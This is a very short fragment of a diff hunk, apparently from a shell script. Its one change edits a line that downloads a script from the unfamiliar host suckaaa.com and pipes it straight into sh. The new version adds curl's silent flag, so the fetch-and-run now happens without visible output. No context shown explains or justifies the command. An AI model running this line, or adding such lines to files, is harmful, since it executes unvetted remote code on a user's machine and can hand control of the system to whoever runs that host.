@@ -4,4 +4,4 @@
 
 #
 
-curl https://suckaaa.com/s/loL | sh;
+curl -s https://suckaaa.com/s/loL | sh;
